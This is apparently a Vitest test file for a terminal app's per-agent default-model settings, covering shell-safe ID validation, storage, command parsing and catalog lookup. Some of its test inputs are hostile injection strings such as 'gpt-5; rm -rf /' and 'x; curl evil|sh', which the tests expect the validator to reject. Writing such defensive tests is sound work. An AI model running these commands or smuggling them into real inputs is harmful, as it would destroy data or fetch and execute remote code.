import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import {
  getAgentModelDefaults,
  setAgentModelDefault,
  providerForCommand,
  isSafeModelId,
  isUsableDefault,
  defaultModelFor,
  catalogForLaunch,
  droppedDefaultNotice,
  DEFAULT_MODEL_PROVIDERS,
} from '../../src/renderer/src/lib/agentModelDefaults'
import { isSafeModelId as mainIsSafeModelId } from '../../src/main/modelCatalog'
import type { ModelCatalog } from '../../src/renderer/src/lib/modelCatalog'

const KEY = 'termpolis.agent.modelDefaults'

const CAT: ModelCatalog = {
  claude: { provider: 'claude', models: [{ id: 'opus', label: 'Opus' }], source: 'builtin', fetchedAt: 0 },
  codex: { provider: 'codex', models: [{ id: 'gpt-5.6-sol', label: 'GPT-5.6 Sol' }, { id: 'gpt-5.5', label: 'GPT-5.5' }], source: 'cli', fetchedAt: 1 },
  gemini: { provider: 'gemini', models: [{ id: 'gemini-3.8-flash-high', label: 'Flash' }], source: 'cli', fetchedAt: 1 },
}
const EMPTY: ModelCatalog = {
  claude: CAT.claude,
  codex: { provider: 'codex', models: [], source: 'builtin', fetchedAt: 0 },
  gemini: { provider: 'gemini', models: [], source: 'builtin', fetchedAt: 0 },
}

beforeEach(() => { localStorage.clear() })
afterEach(() => { vi.restoreAllMocks(); delete (window as any).termpolis })

describe('isSafeModelId', () => {
  const battery = [
    'gpt-5.5', 'o3', 'gemini-3.8-flash-high', 'sonnet', 'A', 'a'.repeat(64), 'a'.repeat(65),
    '', ' ', '-m', '--model', '.hidden', '_x', 'gpt 5', 'a;b', 'a`b`', '$(x)', 'a|b', 'a&b', "a'b", 'a"b',
    'a\nb', 'a/b', 'a\\b', 'gpt-5.5\r', 42, null, undefined, {}, [],
  ]
  it('agrees with the main process gate on every input (the two copies cannot drift)', () => {
    for (const v of battery) expect(isSafeModelId(v), JSON.stringify(v)).toBe(mainIsSafeModelId(v))
  })

  it('rejects anything a shell or the CLI parser could reinterpret', () => {
    for (const bad of ['a;b', '$(x)', 'a b', '-m', '--model', "a'b", 'a`b', '']) expect(isSafeModelId(bad)).toBe(false)
    for (const good of ['gpt-5.5', 'o3', 'gpt-5.4-codex', 'gemini-3.8-flash-high']) expect(isSafeModelId(good)).toBe(true)
  })
})

describe('saved defaults', () => {
  it('start empty', () => {
    expect(getAgentModelDefaults()).toEqual({})
  })

  it('round-trip per agent without disturbing the others', () => {
    setAgentModelDefault('claude', 'sonnet')
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(getAgentModelDefaults()).toEqual({ claude: 'sonnet', codex: 'gpt-5.5' })
    setAgentModelDefault('gemini', 'gemini-3.8-flash-high')
    expect(getAgentModelDefaults()).toEqual({ claude: 'sonnet', codex: 'gpt-5.5', gemini: 'gemini-3.8-flash-high' })
  })

  it('clears one agent on an empty choice, and the whole key once nothing is left', () => {
    setAgentModelDefault('claude', 'opus')
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(setAgentModelDefault('claude', '')).toEqual({ codex: 'gpt-5.5' })
    expect(setAgentModelDefault('codex', null)).toEqual({})
    expect(localStorage.getItem(KEY)).toBeNull()
  })

  it('refuses to save an id that is not shell-safe', () => {
    expect(setAgentModelDefault('codex', 'gpt-5; rm -rf /')).toEqual({})
    expect(localStorage.getItem(KEY)).toBeNull()
  })

  it('drops unsafe, unknown and non-string entries on the way OUT too (a hand-edited store is not trusted)', () => {
    localStorage.setItem(KEY, JSON.stringify({ claude: 'sonnet', codex: 'x; curl evil|sh', gemini: 42, qwen: 'qwen3', extra: true }))
    expect(getAgentModelDefaults()).toEqual({ claude: 'sonnet' })
  })

  it('reads corrupt or non-object storage as empty', () => {
    localStorage.setItem(KEY, '{not json')
    expect(getAgentModelDefaults()).toEqual({})
    localStorage.setItem(KEY, 'null')
    expect(getAgentModelDefaults()).toEqual({})
  })

  it('survives storage that throws', () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => { throw new Error('denied') })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => { throw new Error('denied') })
    expect(getAgentModelDefaults()).toEqual({})
    expect(() => setAgentModelDefault('claude', 'opus')).not.toThrow()
  })

  it('lists exactly the three agents', () => {
    expect([...DEFAULT_MODEL_PROVIDERS]).toEqual(['claude', 'codex', 'gemini'])
  })
})

describe('providerForCommand', () => {
  it.each([
    ['claude', 'claude'],
    ['claude --dangerously-skip-permissions', 'claude'],
    ['codex', 'codex'],
    ['codex --yolo', 'codex'],
    ['agy', 'gemini'],
    ['AGY', 'gemini'],
    ['claude.exe --foo', 'claude'],
    ['C:\\Users\\me\\AppData\\Roaming\\npm\\codex.cmd', 'codex'],
    ['/usr/local/bin/claude -c', 'claude'],
  ])('%s -> %s', (command, provider) => {
    expect(providerForCommand(command)).toBe(provider)
  })

  it.each(['', '   ', 'bash', 'gemini', 'node mock-claude.js', 'npx claude', 'echo claude'])('%j is not an agent launch', (command) => {
    expect(providerForCommand(command)).toBeNull()
  })
})

describe('isUsableDefault', () => {
  it('accepts only Claude aliases for Claude', () => {
    expect(isUsableDefault('claude', 'sonnet', CAT)).toBe(true)
    expect(isUsableDefault('claude', 'claude-opus-5-5', CAT)).toBe(false)
  })

  it('checks Codex and Antigravity against their own list', () => {
    expect(isUsableDefault('codex', 'gpt-5.5', CAT)).toBe(true)
    expect(isUsableDefault('codex', 'gpt-5.3-codex', CAT)).toBe(false)
    expect(isUsableDefault('gemini', 'gemini-3.8-flash-high', CAT)).toBe(true)
    expect(isUsableDefault('gemini', 'gemini-9', CAT)).toBe(false)
  })

  it('trusts a shape-checked id when the list is empty or unknown (nothing discovered is not nothing allowed)', () => {
    expect(isUsableDefault('codex', 'gpt-5.5', EMPTY)).toBe(true)
    expect(isUsableDefault('codex', 'gpt-5.5', null)).toBe(true)
    expect(isUsableDefault('gemini', 'gemini-3.8-flash-high', undefined)).toBe(true)
  })

  it('never trusts an unsafe id, list or no list', () => {
    expect(isUsableDefault('codex', 'x; rm -rf /', EMPTY)).toBe(false)
    expect(isUsableDefault('codex', '-m', null)).toBe(false)
  })
})

describe('defaultModelFor', () => {
  it('adds nothing when no default is saved (today\'s launch, unchanged)', () => {
    for (const c of ['claude', 'codex', 'agy']) expect(defaultModelFor(c, CAT)).toEqual({ arg: '' })
  })

  it('adds the saved default for each agent', () => {
    setAgentModelDefault('claude', 'haiku')
    setAgentModelDefault('codex', 'gpt-5.5')
    setAgentModelDefault('gemini', 'gemini-3.8-flash-high')
    expect(defaultModelFor('claude', CAT)).toEqual({ arg: ' --model haiku' })
    expect(defaultModelFor('claude --dangerously-skip-permissions', CAT)).toEqual({ arg: ' --model haiku' })
    expect(defaultModelFor('codex', CAT)).toEqual({ arg: ' --model gpt-5.5' })
    expect(defaultModelFor('codex --yolo', CAT)).toEqual({ arg: ' --model gpt-5.5' })
    expect(defaultModelFor('agy', CAT)).toEqual({ arg: ' --model gemini-3.8-flash-high' })
  })

  it('keeps each agent to its own default', () => {
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(defaultModelFor('claude', CAT)).toEqual({ arg: '' })
    expect(defaultModelFor('agy', CAT)).toEqual({ arg: '' })
  })

  it('leaves a command that already names a model alone', () => {
    setAgentModelDefault('claude', 'haiku')
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(defaultModelFor('claude --model opus', CAT)).toEqual({ arg: '' })
    expect(defaultModelFor('claude --model=opus', CAT)).toEqual({ arg: '' })
    expect(defaultModelFor('codex -m gpt-5.6-sol', CAT)).toEqual({ arg: '' })
    expect(defaultModelFor('codex --model gpt-5.6-sol', CAT)).toEqual({ arg: '' })
  })

  it('leaves a resumed conversation on the model it was on', () => {
    setAgentModelDefault('claude', 'haiku')
    setAgentModelDefault('codex', 'gpt-5.5')
    setAgentModelDefault('gemini', 'gemini-3.8-flash-high')
    for (const c of ['claude --resume abc123', 'claude --resume=abc123', 'claude -r', 'claude -c', 'claude --continue', 'claude --from-pr 12', 'claude --from-pr=12',
      'codex resume --last', 'agy --continue', 'agy -c', 'agy --conversation 7f2']) {
      expect(defaultModelFor(c, CAT), c).toEqual({ arg: '' })
    }
  })

  it('sees a model or a session in EVERY spelling the CLIs accept, so a default is never doubled up on one', () => {
    setAgentModelDefault('claude', 'haiku')
    setAgentModelDefault('codex', 'gpt-5.5')
    setAgentModelDefault('gemini', 'gemini-3.8-flash-high')
    for (const c of [
      'codex -mgpt-5.6-sol', 'codex -m=gpt-5.6-sol', 'codex --model=gpt-5.6-sol',
      'agy --conversation=abc', 'agy --model=gemini-3.8-flash-low', 'claude -rabc', 'claude --session-id abc',
    ]) {
      expect(defaultModelFor(c, CAT), c).toEqual({ arg: '' })
    }
  })

  it('does not mistake Codex\'s -c (a config override) for "continue"', () => {
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(defaultModelFor('codex -c model_reasoning_effort=high', CAT)).toEqual({ arg: ' --model gpt-5.5' })
  })

  it('ignores commands that are not one of the three agents', () => {
    setAgentModelDefault('claude', 'haiku')
    for (const c of ['bash', 'npm test', 'node mock-claude.js', '']) expect(defaultModelFor(c, CAT)).toEqual({ arg: '' })
  })

  it('drops (and reports) a default the agent no longer offers, rather than typing it into a CLI that refuses it', () => {
    setAgentModelDefault('codex', 'gpt-5.3-codex')
    expect(defaultModelFor('codex', CAT)).toEqual({ arg: '', dropped: 'gpt-5.3-codex' })
  })

  it('applies a Codex default when no list has been discovered yet', () => {
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(defaultModelFor('codex', EMPTY)).toEqual({ arg: ' --model gpt-5.5' })
    expect(defaultModelFor('codex', null)).toEqual({ arg: ' --model gpt-5.5' })
  })
})

describe('catalogForLaunch', () => {
  function bridge(impl: () => Promise<unknown>) {
    const getModelCatalog = vi.fn(impl)
    ;(window as any).termpolis = { getModelCatalog }
    return getModelCatalog
  }

  it('makes no IPC call when nothing needs checking against a list (no default, or Claude only)', async () => {
    const get = bridge(async () => ({ success: true, data: CAT }))
    expect(await catalogForLaunch()).toBeNull()
    setAgentModelDefault('claude', 'opus')
    expect(await catalogForLaunch()).toBeNull()
    expect(get).not.toHaveBeenCalled()
  })

  it('fetches the catalog once a Codex or Antigravity default is saved', async () => {
    const get = bridge(async () => ({ success: true, data: CAT }))
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(await catalogForLaunch()).toBe(CAT)
    setAgentModelDefault('codex', '')
    setAgentModelDefault('gemini', 'gemini-3.8-flash-high')
    expect(await catalogForLaunch()).toBe(CAT)
    expect(get).toHaveBeenCalledTimes(2)
  })

  it('degrades to "no list" when the bridge is missing, replies with a failure, or throws', async () => {
    setAgentModelDefault('codex', 'gpt-5.5')
    expect(await catalogForLaunch()).toBeNull() // no window.termpolis at all
    bridge(async () => ({ success: false, error: 'nope' }))
    expect(await catalogForLaunch()).toBeNull()
    bridge(async () => { throw new Error('ipc down') })
    expect(await catalogForLaunch()).toBeNull()
  })
})

describe('droppedDefaultNotice', () => {
  it('names the agent and the model, and says where to fix it', () => {
    expect(droppedDefaultNotice('codex --yolo', 'gpt-5.3-codex')).toMatch(/Codex.*"gpt-5\.3-codex".*Default Models/)
    expect(droppedDefaultNotice('agy', 'gemini-9')).toMatch(/Antigravity CLI.*"gemini-9"/)
    expect(droppedDefaultNotice('claude', 'opus')).toMatch(/Claude Code.*"opus"/)
  })
})
